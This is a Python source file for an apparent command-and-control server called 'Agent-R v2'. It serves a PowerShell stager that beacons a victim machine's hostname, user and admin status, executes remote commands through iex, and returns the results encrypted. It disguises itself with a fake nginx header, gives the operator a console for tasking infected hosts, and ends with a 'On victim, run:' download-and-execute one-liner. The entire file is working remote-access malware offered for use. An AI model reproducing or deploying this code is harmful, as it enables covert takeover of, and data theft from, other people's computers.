"""
Agent-R v2 API Server
HTTP-based C2 with encrypted JSON protocol
"""

import os
import sys
import json
import base64
import secrets
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from rich.console import Console
from rich.table import Table
from rich.panel import Panel

# Import our modules
from crypto import CryptoHandler
from agent_manager import AgentManager, MANAGER

console = Console()

# Global crypto handler
CRYPTO = CryptoHandler()


class C2APIHandler(BaseHTTPRequestHandler):
    """Handle C2 API requests from agents."""
    
    def log_message(self, format, *args):
        """Suppress default HTTP logging."""
        pass
    
    def send_json(self, data: dict, status: int = 200):
        """Send JSON response."""
        self.send_response(status)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Server', 'nginx/1.18.0')  # Fake server header
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
    
    def do_GET(self):
        """Handle GET requests."""
        parsed = urlparse(self.path)
        
        if parsed.path == '/api/stage':
            # Serve the PowerShell agent stager
            self.serve_stager()
        elif parsed.path == '/health':
            # Health check (looks like normal API)
            self.send_json({"status": "ok", "version": "1.0"})
        else:
            # 404 for unknown paths
            self.send_json({"error": "not found"}, 404)
    
    def do_POST(self):
        """Handle POST requests (beacons, results)."""
        parsed = urlparse(self.path)
        
        try:
            # Read body
            length = int(self.headers.get('Content-Length', 0))
            if length > 1024 * 1024:  # 1MB limit
                self.send_json({"error": "too large"}, 413)
                return
            
            body = self.rfile.read(length).decode()
            
            if parsed.path == '/api/beacon':
                self.handle_beacon(body)
            elif parsed.path == '/api/result':
                self.handle_result(body)
            else:
                self.send_json({"error": "not found"}, 404)
                
        except Exception as e:
            console.print(f"[red]API Error: {e}[/]")
            self.send_json({"error": str(e)}, 500)
    
    def handle_beacon(self, body: str):
        """Handle agent beacon (check-in)."""
        try:
            data = json.loads(body)
            agent_id = data.get('id')
            
            if not agent_id:
                self.send_json({"error": "missing id"}, 400)
                return
            
            # Decrypt payload if encrypted
            if 'enc' in data:
                decrypted = CRYPTO.decrypt(data['enc'], agent_id)
                data = json.loads(decrypted)
            
            # Register/update agent
            agent = MANAGER.register_agent(
                agent_id=agent_id,
                hostname=data.get('hostname', 'unknown'),
                username=data.get('user', 'unknown'),
                is_admin=data.get('admin', False),
                os_version=data.get('os', 'unknown'),
                pid=data.get('pid', 0)
            )
            
            # Check for pending tasks
            task = MANAGER.get_next_task(agent_id)
            
            if task:
                # Encrypt task for agent
                task_data = {
                    "task_id": task.task_id,
                    "type": task.task_type,
                    "payload": task.payload
                }
                encrypted = CRYPTO.encrypt(json.dumps(task_data).encode(), agent_id)
                self.send_json({"enc": encrypted})
                console.print(f"[cyan]Task sent to {agent_id[:8]}: {task.task_type}[/]")
            else:
                # No tasks - send empty response (looks like normal 200)
                self.send_json({"status": "ok"})
                
        except json.JSONDecodeError:
            self.send_json({"error": "invalid json"}, 400)
    
    def handle_result(self, body: str):
        """Handle task result from agent."""
        try:
            data = json.loads(body)
            agent_id = data.get('id')
            task_id = data.get('task_id')
            
            if not agent_id or not task_id:
                self.send_json({"error": "missing fields"}, 400)
                return
            
            # Decrypt result
            result = data.get('output', '')
            if 'enc' in data:
                result = CRYPTO.decrypt(data['enc'], agent_id).decode()
            
            # Store result
            MANAGER.complete_task(agent_id, task_id, result)
            
            # Print result to console
            console.print(Panel(result, title=f"Result from {agent_id[:8]}", border_style="green"))
            
            self.send_json({"status": "received"})
            
        except Exception as e:
            console.print(f"[red]Result error: {e}[/]")
            self.send_json({"error": str(e)}, 500)
    
    def serve_stager(self):
        """Serve PowerShell HTTP agent stager."""
        # Get server address for callback
        host = self.headers.get('Host', 'localhost:8443')
        
        # Generate unique agent ID
        agent_id = f"agent-{secrets.token_hex(8)}"
        
        # Get master key for this agent
        master_key_b64 = base64.b64encode(CRYPTO.master_key).decode()
        
        stager = f'''
$id = "{agent_id}"
$c2 = "https://{host}"
$sleep = 5
$jitter = 0.3

# Session key derivation (must match server)
function Get-Key {{
    $m = [Convert]::FromBase64String("{master_key_b64}")
    $sha = [Security.Cryptography.SHA256]::Create()
    return $sha.ComputeHash($m + [Text.Encoding]::UTF8.GetBytes($id))
}}

# XOR encrypt/decrypt
function Crypt-Data {{
    param([byte[]]$d)
    $k = Get-Key
    return [byte[]](0..($d.Length-1) | %{{ $d[$_] -bxor $k[$_ % $k.Length] }})
}}

# Beacon loop
while($true) {{
    try {{
        # Build beacon
        $b = @{{
            id = $id
            hostname = $env:COMPUTERNAME
            user = $env:USERNAME
            admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
            os = (Get-WmiObject Win32_OperatingSystem).Caption
            pid = $PID
        }}
        
        # Send beacon
        $r = Invoke-RestMethod -Uri "$c2/api/beacon" -Method POST -Body ($b | ConvertTo-Json) -ContentType "application/json" -UseBasicParsing
        
        # Check for task
        if ($r.enc) {{
            $dec = [Text.Encoding]::UTF8.GetString((Crypt-Data ([Convert]::FromBase64String($r.enc))))
            $task = $dec | ConvertFrom-Json
            
            # Execute task
            $output = ""
            switch ($task.type) {{
                "exec" {{ $output = iex $task.payload 2>&1 | Out-String }}
                "exit" {{ exit }}
                default {{ $output = "Unknown task type" }}
            }}
            
            # Send result
            $enc = [Convert]::ToBase64String((Crypt-Data ([Text.Encoding]::UTF8.GetBytes($output))))
            $res = @{{ id = $id; task_id = $task.task_id; enc = $enc }}
            Invoke-RestMethod -Uri "$c2/api/result" -Method POST -Body ($res | ConvertTo-Json) -ContentType "application/json" -UseBasicParsing | Out-Null
        }}
    }} catch {{}}
    
    # Sleep with jitter
    $s = $sleep + (Get-Random -Minimum (-$sleep * $jitter) -Maximum ($sleep * $jitter))
    Start-Sleep -Seconds ([Math]::Max(1, $s))
}}
'''
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(stager.encode())
        console.print(f"[yellow]Stager served (Agent ID: {agent_id})[/]")


class C2Server:
    """Main C2 Server class."""
    
    def __init__(self, host: str = '0.0.0.0', port: int = 8443, 
                 cert_file: str = None, key_file: str = None):
        self.host = host
        self.port = port
        self.cert_file = cert_file
        self.key_file = key_file
        self.server = None
        self.manager = MANAGER
        self.crypto = CRYPTO
    
    def start(self):
        """Start the C2 server."""
        import ssl
        
        self.server = HTTPServer((self.host, self.port), C2APIHandler)
        
        # Enable TLS if certs provided
        if self.cert_file and self.key_file:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(self.cert_file, self.key_file)
            self.server.socket = context.wrap_socket(self.server.socket, server_side=True)
            console.print(f"[green]C2 Server started on https://{self.host}:{self.port}[/]")
        else:
            console.print(f"[yellow]C2 Server started on http://{self.host}:{self.port} (no TLS)[/]")
        
        # Run in thread
        thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        thread.start()
        return thread
    
    def stop(self):
        """Stop the server."""
        if self.server:
            self.server.shutdown()


def print_agents():
    """Print agent table."""
    agents = MANAGER.list_agents()
    if not agents:
        console.print("[yellow]No agents connected[/]")
        return
    
    table = Table(title="Connected Agents")
    table.add_column("ID", style="cyan")
    table.add_column("Hostname", style="green")
    table.add_column("User", style="yellow")
    table.add_column("Admin", style="red")
    table.add_column("Last Seen", style="dim")
    table.add_column("Tasks", style="magenta")
    
    for a in agents:
        admin = "YES" if a['admin'] else "no"
        status = f"{a['last_seen']}s ago" if a['alive'] else "DEAD"
        table.add_row(a['id'], a['hostname'], a['user'], admin, status, str(a['pending_tasks']))
    
    console.print(table)


def interactive_shell():
    """Interactive shell for operator."""
    console.print(Panel("""
[bold cyan]Agent-R v2 C2 Console[/]

Commands:
  agents          - List connected agents
  use <id>        - Select agent for interaction  
  exec <cmd>      - Execute command on selected agent
  shell           - Enter interactive shell mode
  exit            - Exit console
""", title="Help"))
    
    while True:
        try:
            current = MANAGER.get_current_agent()
            prompt = f"[{current.hostname if current else 'no agent'}]> "
            cmd = console.input(prompt).strip()
            
            if not cmd:
                continue
            
            parts = cmd.split(maxsplit=1)
            action = parts[0].lower()
            
            if action == 'agents':
                print_agents()
            
            elif action == 'use' and len(parts) > 1:
                if MANAGER.select_agent(parts[1]):
                    console.print(f"[green]Selected agent {parts[1]}[/]")
                else:
                    console.print(f"[red]Agent not found[/]")
            
            elif action == 'exec' and len(parts) > 1:
                if current:
                    task = MANAGER.queue_task(current.agent_id, "exec", parts[1])
                    console.print(f"[cyan]Task queued: {task.task_id[:8]}[/]")
                else:
                    console.print("[red]No agent selected. Use 'use <id>' first[/]")
            
            elif action == 'shell':
                if current:
                    console.print("[yellow]Shell mode - type commands, 'back' to exit[/]")
                    while True:
                        shell_cmd = console.input("PS> ").strip()
                        if shell_cmd.lower() == 'back':
                            break
                        MANAGER.queue_task(current.agent_id, "exec", shell_cmd)
                else:
                    console.print("[red]No agent selected[/]")
            
            elif action in ['exit', 'quit']:
                break
            
            else:
                console.print(f"[dim]Unknown command: {action}[/]")
                
        except KeyboardInterrupt:
            console.print("\n[yellow]Use 'exit' to quit[/]")
        except EOFError:
            break


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='Agent-R v2 C2 Server')
    parser.add_argument('--port', type=int, default=8443, help='Listen port')
    parser.add_argument('--cert', help='TLS certificate file')
    parser.add_argument('--key', help='TLS key file')
    args = parser.parse_args()
    
    console.print("""
    [bold cyan]
     █████╗  ██████╗ ███████╗███╗   ██╗████████╗   ██████╗ 
    ██╔══██╗██╔════╝ ██╔════╝████╗  ██║╚══██╔══╝   ██╔══██╗
    ███████║██║  ███╗█████╗  ██╔██╗ ██║   ██║█████╗██████╔╝
    ██╔══██║██║   ██║██╔══╝  ██║╚██╗██║   ██║╚════╝██╔══██╗
    ██║  ██║╚██████╔╝███████╗██║ ╚████║   ██║      ██║  ██║
    ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝   ╚═╝      ╚═╝  ╚═╝
                         v2.0 - HTTP C2
    [/]""")
    
    server = C2Server(port=args.port, cert_file=args.cert, key_file=args.key)
    server.start()
    
    console.print(f"""
[bold]Stager URL:[/] https://YOUR_IP:{args.port}/api/stage

[bold]On victim, run:[/]
IEX(IWR https://YOUR_IP:{args.port}/api/stage -UseBasic).Content
""")
    
    interactive_shell()
    
    server.stop()
    console.print("[yellow]Goodbye![/]")
